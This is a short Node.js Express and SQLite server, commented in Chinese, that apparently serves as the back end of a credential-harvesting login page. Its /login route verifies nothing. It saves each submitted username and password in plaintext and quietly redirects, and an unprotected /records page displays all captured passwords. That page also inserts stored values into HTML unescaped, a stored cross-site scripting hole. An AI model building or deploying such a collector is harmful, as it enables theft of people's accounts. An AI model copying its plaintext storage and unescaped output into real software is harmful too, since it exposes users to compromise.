const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const db = new sqlite3.Database('./login.db');

// 建立 login_records 表
db.run(`
    CREATE TABLE IF NOT EXISTS login_records (
                                                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                                                 username TEXT NOT NULL,
                                                 password TEXT NOT NULL,
                                                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
`);

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname))); // 提供 index.html 靜態頁面

// ✅ 登入寫入資料庫
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).send('請填寫帳號與密碼');
    }

    db.run(
        "INSERT INTO login_records (username, password) VALUES (?, ?)",
        [username, password],
        (err) => {
            if (err) {
                return res.status(500).send('寫入資料庫失敗');
            }
            res.redirect('/'); // 登入成功後不顯示訊息，只回首頁
        }
    );
});

// ✅ 新增登入紀錄表格頁面
app.get('/records', (req, res) => {
    db.all("SELECT username, password, timestamp FROM login_records ORDER BY timestamp DESC", [], (err, rows) => {
        if (err) {
            return res.status(500).send('讀取資料失敗');
        }

        // 建立 HTML 表格
        const tableRows = rows.map(r => `
            <tr>
                <td>${r.username}</td>
                <td>${r.password}</td>
                <td>${r.timestamp}</td>
            </tr>
        `).join('');

        const html = `
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <title>登入紀錄</title>
                <style>
                    body {
                        font-family: sans-serif;
                        background-color: #f9f9f9;
                        padding: 40px;
                    }
                    table {
                        width: 100%;
                        max-width: 800px;
                        margin: auto;
                        border-collapse: collapse;
                        background: #fff;
                        box-shadow: 0 2px 8px rgba(0,0,0,0.1);
                    }
                    th, td {
                        border: 1px solid #ddd;
                        padding: 12px 16px;
                        text-align: center;
                    }
                    th {
                        background-color: #2ea44f;
                        color: white;
                    }
                    tr:nth-child(even) {
                        background-color: #f3f3f3;
                    }
                    h1 {
                        text-align: center;
                        margin-bottom: 24px;
                        color: #2c974b;
                    }
                    a.back {
                        display: block;
                        text-align: center;
                        margin-top: 20px;
                        color: #0969da;
                        text-decoration: none;
                    }
                </style>
            </head>
            <body>
                <h1>登入紀錄表</h1>
                <table>
                    <thead>
                        <tr><th>帳號</th><th>密碼</th><th>登入時間</th></tr>
                    </thead>
                    <tbody>
                        ${tableRows}
                    </tbody>
                </table>
                <a class="back" href="/">← 返回登入頁</a>
            </body>
            </html>
        `;

        res.send(html);
    });
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`✅ Server running at http://localhost:${PORT}`);
});
